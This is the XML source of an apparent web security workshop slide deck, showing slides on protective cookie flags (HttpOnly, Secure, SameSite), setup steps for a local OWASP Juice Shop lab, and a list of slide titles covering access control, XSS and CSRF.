          <a:xfrm>
            <a:off x="2946733" y="1516620"/>
            <a:ext cx="8953530" cy="511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set-cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>authToken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=eyJhbGciOiJIUzI1NiIsInR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[…]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Max-Age=86400; Path=/; Expires=Sun, 01 Feb 2026 17:30:16 GMT;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HttpOnly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Secure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SameSite=Strict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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="67CA95"/>
              </a:solidFill>
              <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HttpOnly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JavaScript can not read this</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Secure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Browser will not send over HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SameSite=Strict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Browser will not send via cross-site request (CSRF)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35BD7DAA-76D3-7E85-94D5-943F2C62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57965CEC-E503-89C7-07A4-317023EC3CB9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38300448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575FA-0999-D9E7-CC9C-A2F830E5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E771-73CF-46D0-9B24-FF8AC4A0B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Protecting Cookies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BD7D0-0FF7-D73B-726B-4CA894B0A901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452A11-BE77-EF45-63C2-9C552F7D5F81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B6D39A-B621-7A95-2F51-616E9B30B8A5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78748A-C22A-353F-71DC-2EFBC54FB881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E503DF-7D4F-C704-7871-F6C1BE6B5E2F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C41AB4-4C98-045F-BA71-C253474DCA2E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52E2A6-18EB-3E04-49E1-C02A151D0BE7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53D69036-339C-63A4-029D-3DFF2032D6BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2946733" y="1516620"/>
            <a:ext cx="8953530" cy="511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set-cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>authToken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=eyJhbGciOiJIUzI1NiIsInR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[…]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Max-Age=86400; Path=/; Expires=Sun, 01 Feb 2026 17:30:16 GMT;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HttpOnly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Secure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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SameSite=Strict</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="67CA95"/>
              </a:solidFill>
              <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HttpOnly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JavaScript can not read this</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Secure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Browser will not send over HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SameSite=Strict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chemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Browser will not send via cross-site request (CSRF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Don’t put them in Local Storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="2800" dirty="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algn="l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F5D1F04D-297B-4E05-C05E-E6D587D7A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CC053931-51A5-D9F8-4943-BF3815777316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</p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="618456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72804-076A-C4C8-6C5C-9B7D0E701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C5FF-B8B6-46C7-CCBE-10BCA0726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638" y="119859"/>
            <a:ext cx="9258299" cy="90328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Want More?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834CC-EEB5-3FE9-F3A2-D283CAF47B74}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1"/>
            <a:ext cx="2669381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Setup &amp; Configuration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B713C1-AA2D-23F8-16E1-B42BDF62BC91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="1143001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Web Security Basics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BA83B-8C63-F005-6F36-E613370AE1A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2286000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Broken Access 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9835AC-2575-8BE8-E92A-3329AA9833C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-2380" y="3428999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XSS to Admin Takeover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72A269-F9F7-44E3-4A9A-0AF4D9C228BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4571998"/>
            <a:ext cx="2671763" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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Cross-Site Request Forgery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F9336D-86E7-62CB-36DA-673E21F9712E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5715001"/>
            <a:ext cx="2671763" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="67CA95"/>
          </a:solidFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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Bonus Activities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33C998E-14F5-3B50-D645-2846E1402851}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2669383" y="1143001"/>
            <a:ext cx="9522616" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA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OWASP Juice Shop">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68322021-3E0B-B6B0-53D5-EA4551F74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3831709"/>
            <a:ext cx="2186315" cy="262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1A51D925-AA71-A868-4D93-956F2266E374}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3136900" y="1558007"/>
            <a:ext cx="8953530" cy="2315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OWASP Juice Shop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Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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docker pull </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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bkimminich</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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/juice-shop</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="808080"/>
              </a:highlight>
              <a:latin typeface="Andale Mono" panose="020B05090000000000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Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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docker run --rm -p 3000:3000 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1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bkimminich</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="808080"/>
                </a:highlight>
                <a:latin typeface="Andale Mono" panose="020B0509000000000004" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/juice-shop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Browse to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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http://localhost:3000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sz="1800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49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B4FDCAF-211D-F098-1C6F-470630BB53F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5682783" y="4288098"/>
            <a:ext cx="6111911" cy="1744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First Hint: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Find the “Score Board” page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</a:rPr>
              <a:t>Inspect the frontend code </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2" descr="A qr code with a star and a star on it&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{653B7C24-7A9D-3D08-2EE0-B32EA0D2C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2005" y="59929"/>
            <a:ext cx="1023144" cy="102314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90E1B2C-6C6D-6F46-5396-B6EB017DB384}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9533744" y="20544"/>
            <a:ext cx="1528261" cy="776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dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Feedback QR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DE065-E3AA-EEAC-1FF1-E11C5DA1CA21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8976575" y="1234841"/>
            <a:ext cx="3215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7CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Don’t forget to leave me review if you enjoyed the workshop!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="418328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38546</TotalTime>
  <Words>3145</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>710</Paragraphs>
  <Slides>49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Andale Mono</vt:lpstr>
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Aptos Mono</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Advanced Web Threats</vt:lpstr>
      <vt:lpstr>Agenda</vt:lpstr>
      <vt:lpstr>Setup and Configuration</vt:lpstr>
      <vt:lpstr>Setup and Configuration</vt:lpstr>
      <vt:lpstr>Setup and Configuration</vt:lpstr>
      <vt:lpstr>The Internet</vt:lpstr>
      <vt:lpstr>Anatomy of Requests</vt:lpstr>
      <vt:lpstr>Anatomy of Requests</vt:lpstr>
      <vt:lpstr>Anatomy of Responses</vt:lpstr>
      <vt:lpstr>Frontend, Backend, and Browser</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Frontend, Backend, and Browser</vt:lpstr>
      <vt:lpstr>Frontend, Backend, and Browser</vt:lpstr>
      <vt:lpstr>Browsers and JavaScript</vt:lpstr>
      <vt:lpstr>Same Origin Policy</vt:lpstr>
      <vt:lpstr>What is an “Origin”?</vt:lpstr>
      <vt:lpstr>Sessions</vt:lpstr>
      <vt:lpstr>Sessions</vt:lpstr>
      <vt:lpstr>Sessions</vt:lpstr>
      <vt:lpstr>Intro: Broken Access Control</vt:lpstr>
      <vt:lpstr>Function Level &amp; Object Level </vt:lpstr>
      <vt:lpstr>Function Level &amp; Object Level </vt:lpstr>
      <vt:lpstr>Examine Claim Application App</vt:lpstr>
      <vt:lpstr>Claim Application Test</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Review: Broken Access Control</vt:lpstr>
      <vt:lpstr>Review: Broken Access Control</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting Refresher</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting Refresher</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting Refresher</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting Refresher</vt:lpstr>
      <vt:lpstr>Attacker Server</vt:lpstr>
      <vt:lpstr>Claims App XSS</vt:lpstr>
      <vt:lpstr>Review: Claims App XSS</vt:lpstr>
      <vt:lpstr>Review: Claims App XSS</vt:lpstr>
      <vt:lpstr>Review: Claims App XSS</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Protecting Cookies</vt:lpstr>
      <vt:lpstr>Protecting Cookies</vt:lpstr>
      <vt:lpstr>Protecting Cookies</vt:lpstr>
      <vt:lpstr>Want More?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Pipia</dc:creator>
  <cp:lastModifiedBy>Anthony Pipia</cp:lastModifiedBy>
  <cp:revision>20</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-05T17:06:19Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-07T19:26:38Z</dcterms:modified>
</cp:coreProperties>
</file>